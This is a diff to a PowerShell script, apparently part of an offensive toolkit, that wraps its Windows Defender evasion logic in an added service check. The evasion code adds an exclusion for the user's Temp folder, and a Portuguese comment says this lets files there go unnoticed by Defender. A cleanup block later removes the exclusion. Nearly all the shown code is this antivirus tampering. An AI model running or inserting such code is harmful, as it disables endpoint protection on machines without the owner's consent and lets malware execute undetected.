@@ -101,24 +101,27 @@ If([bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -Ma
 
 ## Create %TMP% directory exclusion in windows Defender
 write-host "[-] Running with admin creds .." -ForegroundColor Green
-If((Get-MpComputerStatus).RealTimeProtectionEnabled -Match '^(True)$')
+If([bool](Get-Service -Name "WinDefend") -Match '^(True)$')
 {
-
-   <#
-   .DESCRIPTION
-      Esta funcçao cria uma exclusao no windows defender ( se a protecçao
-      activa estiver a funcionar ) que aponta para a pasta TEMP permitindo-nos
-      utilizar a pasta seleccionada para passar despercebido pelo windows defender.
-   #>
-
-   ## Make sure the exclusion does NOT already exist
-   If((Get-MpPreference).ExclusionPath -NotMatch '(\\Temp)$')
+   If((Get-MpComputerStatus).RealTimeProtectionEnabled -Match '^(True)$')
    {
-      If([bool]((Get-Module -ListAvailable -Name "ConfigDefender").ExportedCommands|findstr /C:"Set-MpPreference") -Match '^(True)$')
+
+      <#
+      .DESCRIPTION
+         Esta funcçao cria uma exclusao no windows defender ( se a protecçao
+         activa estiver a funcionar ) que aponta para a pasta TEMP permitindo-nos
+         utilizar a pasta seleccionada para passar despercebido pelo windows defender.
+      #>
+
+      ## Make sure the exclusion does NOT already exist
+      If((Get-MpPreference).ExclusionPath -NotMatch '(\\Temp)$')
       {
-         write-host "[*] Creating defender exclusion .." -ForegroundColor Green
-         Set-MpPreference -ExclusionPath "C:\Users\$ENV:USERNAME\AppData\Local\Temp" -Force
-         Start-Sleep -Milliseconds 4000 # Give extra time for rule to became 'active' ?
+         If([bool]((Get-Module -ListAvailable -Name "ConfigDefender").ExportedCommands|findstr /C:"Set-MpPreference") -Match '^(True)$')
+         {
+            write-host "[*] Creating defender exclusion .." -ForegroundColor Green
+            Set-MpPreference -ExclusionPath "C:\Users\$ENV:USERNAME\AppData\Local\Temp" -Force
+            Start-Sleep -Milliseconds 4000 # Give extra time for rule to became 'active' ?
+         }
       }
    }
 }
@@ -209,15 +212,18 @@ Remove-Item -Path "${Env:TMP}\mspass.msc" -Force
 
 Start-Sleep -Milliseconds 800
 ## Windows Defender Exclusion - CleanUp
-If((Get-MpComputerStatus).RealTimeProtectionEnabled -Match '^(True)$')
+If([bool](Get-Service -Name "WinDefend") -Match '^(True)$')
 {
-   ## Make sure the exclusion exists
-   If((Get-MpPreference).ExclusionPath -Match '(\\Temp)$')
+   If((Get-MpComputerStatus).RealTimeProtectionEnabled -Match '^(True)$')
    {
-      If([bool]((Get-Module -ListAvailable -Name "ConfigDefender").ExportedCommands|findstr /C:"Remove-MpPreference") -Match '^(True)$')
+      ## Make sure the exclusion exists
+      If((Get-MpPreference).ExclusionPath -Match '(\\Temp)$')
       {
-         write-host "[*] Deleting defender exclusion .." -ForegroundColor Green
-         Remove-MpPreference -ExclusionPath "C:\Users\$ENV:USERNAME\AppData\Local\Temp" -Force
+         If([bool]((Get-Module -ListAvailable -Name "ConfigDefender").ExportedCommands|findstr /C:"Remove-MpPreference") -Match '^(True)$')
+         {
+            write-host "[*] Deleting defender exclusion .." -ForegroundColor Green
+            Remove-MpPreference -ExclusionPath "C:\Users\$ENV:USERNAME\AppData\Local\Temp" -Force
+         }
       }
    }
 }
